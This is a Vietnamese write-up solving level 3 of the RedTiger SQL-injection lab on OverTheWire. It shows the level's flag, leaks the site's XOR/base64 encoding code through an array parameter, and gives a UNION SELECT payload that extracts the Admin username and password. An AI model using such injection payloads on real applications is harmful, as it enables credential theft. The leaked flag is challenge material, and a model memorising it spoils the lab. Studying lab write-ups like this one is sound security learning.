##Level 3: 	http://redtiger.labs.overthewire.org/level3.php

flag:`a707b245a60d570d25a0449c2a516eca
`

- vào mục admin trong web:

<img src="http://image.prntscr.com/image/d2e9999ec281411590e74ad5b6e97d56.png">

- bài này chứa 	usr chắc là giống id :)) url có tác dụng truyền biến biến vào 1 mảng

- tiếp tục vào địa chỉ : http://redtiger.labs.overthewire.org/level3.php?usr[] // thêm đoạn usr[] vào cuối url

<img src="http://image.prntscr.com/image/d6e6022da1674afc8317652f4ca1f0b3.png">


thông thường người ta lưu 1 đoạn js,css hay php ở địa chỉ dầu / tên code , ở đây `/urlcrypt.inc` 

```

<?php
        
    function encrypt($str)
    {
        $cryptedstr = "";
        for ($i =0; $i < strlen($str); $i++)
        {
            $temp = ord(substr($str,$i,1)) ^ 192;
            
            while(strlen($temp)<3)
            {
                $temp = "0".$temp;
            }
            $cryptedstr .= $temp. "";
        }
        return base64_encode($cryptedstr);
    }
  
    function decrypt ($str)
    {
        if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
        {
            $str = base64_decode($str);
            if ($str != "" && $str != null && $str != false)
            {
                $decStr = "";
                
                for ($i=0; $i < strlen($str); $i+=3)
                {
                    $array[$i/3] = substr($str,$i,3);
                }

                foreach($array as $s)
                {
                    $a = $s^192;
                    $decStr .= chr($a);
                }
                
                return $decStr;
            }
            return false;
        }
        return false;
    }
?>
```

- đoạn code này dùng để mã hóa và giải mã! ở đây code PHP :  `// warning! ugly code ahead :)` đoạn comment này cho ta biết cần dùng đoạn code đầu

- truyền lệnh `union select` cho code 

<img src="http://image.prntscr.com/image/c61e8773d6c3470b856d5ba9a4c41917.png">

- thế đoạn code vừa giải , vào đoạn url

<img src="http://image.prntscr.com/image/1d39be61ed0842078cee08ab4925d529.png">


- tiếp tục khai thác ở bảng : gợi ý cho tển bảng là `level3_users`

truyền lệnh :"' union select 1,2,3,password,username,6,7 from level3_users where username='Admin' -- " vào code trên ta  có đc đoạn 



thế đoạn này vào usr ra kết quả.

<img src="http://image.prntscr.com/image/2026001c8ab241ebb1b717e92d5ecdf2.png">
